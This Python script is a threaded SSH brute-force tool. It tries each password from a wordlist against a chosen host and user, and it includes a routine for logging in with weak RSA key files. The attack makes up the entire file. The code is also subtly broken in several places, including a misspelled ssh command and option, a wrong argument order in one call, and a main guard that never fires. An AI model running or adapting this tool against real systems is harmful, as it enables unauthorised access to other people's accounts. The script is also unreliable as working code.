# Main purpose is to brute force SSH
import pexpect
import optparse
import time
from pexpect import pxssh
from threading import *
max_connections = 5
connection_lock = BoundedSemaphore(value=max_connections)
stop = False
found = False
fails = 0
PROMPT = ['#', '.', '>>>', '. ', '> ', '$ ']


# Using Weak RSA Keys
def connect_rsa(user, host, keyfile, release):
    global stop
    global fails
    try:
        perm_denied = 'Permission denied'
        ssh_neykey = 'Continue?'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthenication=no'
        conn_string = 'shh ' + user + '@' + host + '-i' + keyfile + opt
        child = pexpect.spawn(conn_string)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_neykey, conn_closed, '$', '#'])
        if ret == 2:
            print('Adding Host to ~/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print('Connection Closed by remote host')
            fails += 1
        elif ret > 3:
            print('Success ' + str(keyfile))
            stop = True
    finally:
        if release:
            connection_lock.release()


def send_command(s, cmd):
    s.sendline(cmd)
    s.expect(PROMPT)
    print(s.before)


def connect(host, user, password, release):
    global found
    global fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print("Password Found: " + password)
        found = True
    except pxssh.ExceptionPexpect as e:
        if 'read_nonblocking' in e:
            fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'syncrhonize with original prompt' in e:
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


# For brute force SSH
def main():
    parser = optparse.OptionParser('usag%prog ', '-H <target host> -u <user> -F <password-list>')
    parser.add_option('-H', dest='target_host', type='string', help='specify target host')
    parser.add_option('-F', dest='passwd_file', type='string', help='specifiy password file')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    options, args = parser.parse_args()
    host = options.target_host
    password_file = options.passwd_file
    user = options.user
    if host is None or password_file is None or user is None:
        print(parser.usage)
        exit(0)

    with open(password_file, "r") as fn:
        for line in fn:
            if found:
                print("Exiting: Password found")
                exit(0)
            if fails > 5:
                print("Exiting: Too many Socket timeouts")
                exit(0)
            connection_lock.acquire()
            password = line.rstrip()
            print("Testing: " + password_file)
            t = Thread(target=connect, args=(host, user, password, True))
            t.start()


if __name__ == 'main':
    main()
